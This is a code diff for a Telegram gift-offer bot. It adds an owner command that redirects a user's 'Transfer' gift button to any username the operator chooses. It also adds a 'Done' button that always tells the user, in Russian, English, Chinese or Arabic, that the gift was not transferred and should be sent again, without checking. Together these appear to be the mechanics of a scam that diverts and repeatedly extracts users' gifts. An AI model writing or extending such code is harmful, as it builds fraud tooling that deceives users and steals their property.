@@ -17,6 +17,7 @@ from aiogram.types import (CallbackQuery, InlineKeyboardButton, InlineKeyboardMa
 from config import load_config
 from database import Database
 from offer import (ACCEPT_EMOJI_ID, DECLINE_EMOJI_ID, GIFT_EMOJI_ID, TRANSFER_EMOJI_ID,
+                   PREMIUM_EMOJI_ID, DONE_EMOJI_ID,
                    display_amount, format_remaining, gift_title, make_expiry, parse_offer)
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
@@ -29,6 +30,7 @@ dp = Dispatcher()
 offer_locks = {}
 awaiting_broadcast = set()
 awaiting_support = set()
+awaiting_profile_change = {}  # {admin_user_id: target_user_id}
 
 
 def display_name(user) -> str:
@@ -65,9 +67,11 @@ def offer_keyboard(offer_id: int, locale: str):
 
 def transfer_keyboard(url: str, locale: str, offer_id: int):
     labels = {"ru": "Передать", "en": "Transfer", "cn": "转赠", "ar": "نقل الهدية"}
-    return InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text=labels.get(locale, labels["ru"]), icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)
-    ]])
+    done_labels = {"ru": "Готово", "en": "Done", "cn": "完成", "ar": "تم"}
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=labels.get(locale, labels["ru"]), icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)],
+        [InlineKeyboardButton(text=done_labels.get(locale, done_labels["ru"]), icon_custom_emoji_id=DONE_EMOJI_ID, callback_data=f"of:done:{offer_id}")]
+    ])
 
 
 def subscription_keyboard():
@@ -129,6 +133,7 @@ def admin_keyboard():
          InlineKeyboardButton(text="📣 Рассылка", callback_data="adm:broadcast:0")],
         [InlineKeyboardButton(text="📈 Статистика", callback_data="adm:stats:0"),
          InlineKeyboardButton(text="🟢 Выдать доступ по @username", callback_data="adm:allow_username:0")],
+        [InlineKeyboardButton(text="👤 Изменить профиль кнопки 'Передать'", callback_data="adm:change_profile:0")],
         [InlineKeyboardButton(text="🔄 Обновить", callback_data="adm:home:0")],
     ])
 
@@ -640,6 +645,25 @@ async def handle_text(message: Message, is_business: bool):
         await admin_block(int(text.split(maxsplit=1)[1])); await reply_message(message, "🔴 Пользователь заблокирован."); return
     if low.startswith("/unblock ") and message.from_user and message.from_user.id == cfg.owner_id:
         uid=int(text.split(maxsplit=1)[1]); db.unblock_offer_user(uid); await reply_message(message, "🟢 Блокировка снята."); return
+    if low.startswith("/setprofile ") and message.from_user and message.from_user.id == cfg.owner_id:
+        parts = text.split(maxsplit=2)
+        if len(parts) < 3:
+            await reply_message(message, "❌ Формат: <code>/setprofile user_id @username</code>\n\nПример: <code>/setprofile 123456789 @myshop</code>")
+            return
+        try:
+            target_user_id = int(parts[1])
+            new_username = parts[2].lstrip("@")
+            db.set_profile(target_user_id, new_username, f"tg://send_gift?to={new_username}")
+            await reply_message(message, f"✅ Профиль кнопки 'Передать' для пользователя <code>{target_user_id}</code> изменён на @{new_username}")
+            try:
+                await bot.send_message(target_user_id, f"✅ Ваш профиль для кнопки 'Передать' изменён на @{new_username}")
+            except Exception:
+                pass
+        except ValueError:
+            await reply_message(message, "❌ Неверный формат user_id. Используйте числовой ID.")
+        except Exception as e:
+            await reply_message(message, f"❌ Ошибка: {e}")
+        return
 
 
 async def set_transfer(message: Message, username: str):
@@ -989,6 +1013,21 @@ async def admin_callback(call: CallbackQuery):
             await call.message.answer("📣 Отправь материал для рассылки. Для отмены: /cancel")
         return
 
+    if action == "change_profile":
+        await call.answer()
+        text = (
+            "👤 <b>Изменить профиль кнопки 'Передать'</b>\n\n"
+            "Введите команду в формате:\n"
+            "<code>/setprofile user_id @новый_username</code>\n\n"
+            "Пример: <code>/setprofile 123456789 @myshop</code>\n\n"
+            "Это изменит профиль получателя в кнопке 'Передать' для указанного пользователя."
+        )
+        try:
+            await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="↩️ Админка", callback_data="adm:home:0")]]))
+        except Exception:
+            await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="↩️ Админка", callback_data="adm:home:0")]]))
+        return
+
     if action == "payments":
         text, has_next = admin_payments_text(offset)
         markup = payment_history_keyboard(offset, has_next)
@@ -1046,6 +1085,55 @@ async def offer_callback(call: CallbackQuery):
     
     offer_id = int(parts[2])
     action = parts[1]
+    
+    # Обработка кнопки "Готово"
+    if action == "done":
+        offer = db.get_offer(offer_id)
+        if not offer:
+            await call.answer("Офер не найден.", show_alert=True)
+            return
+        
+        title = gift_title(offer["gift_name"], offer["gift_number"])
+        
+        # Создаём inline keyboard с кнопкой OK
+        ok_labels = {"ru": "OK", "en": "OK", "cn": "确定", "ar": "حسنا"}
+        ok_keyboard = InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(
+                text=ok_labels.get(offer["locale"], "OK"),
+                icon_custom_emoji_id=PREMIUM_EMOJI_ID,
+                callback_data=f"of:ok:{offer_id}"
+            )
+        ]])
+        
+        # Текст предупреждения
+        if offer["locale"] == "ru":
+            warning_text = (
+                f"Подарок \"{title}\" не передан покупателю.\n\n"
+                f"Проверьте что подарок успешно отправлен покупателю и повторите попытку ещё раз."
+            )
+        elif offer["locale"] == "cn":
+            warning_text = (
+                f"礼物 \"{title}\" 尚未转交给买家。\n\n"
+                f"请确认礼物已成功发送给买家，然后再试一次。"
+            )
+        elif offer["locale"] == "ar":
+            warning_text = (
+                f"الهدية \"{title}\" لم يتم نقلها إلى المشتري.\n\n"
+                f"تحقق من نجاح إرسال الهدية إلى المشتري وحاول مرة أخرى."
+            )
+        else:
+            warning_text = (
+                f"Gift \"{title}\" has not been transferred to the buyer.\n\n"
+                f"Please verify that the gift was successfully sent to the buyer and try again."
+            )
+        
+        await call.answer(warning_text, show_alert=True)
+        return
+    
+    # Обработка кнопки OK после предупреждения
+    if action == "ok":
+        await call.answer()
+        return
     
     # Обработка принятия/отклонения офера
     if action not in {"accept", "decline"}:
